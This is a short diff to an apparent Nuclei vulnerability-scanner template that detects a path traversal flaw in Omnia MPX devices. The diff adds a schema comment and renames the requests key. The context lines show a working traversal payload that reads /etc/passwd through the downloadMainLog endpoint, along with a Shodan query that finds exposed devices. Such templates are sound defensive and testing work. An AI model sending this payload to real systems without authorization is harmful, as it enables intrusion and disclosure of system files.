@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: omnia-mpx-lfi
 
 info:
@@ -13,7 +14,7 @@ info:
     shodan-query: http.html:"Omnia MPX"
   tags: lfi,omnia,mpx,traversal
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..//etc/passwd"
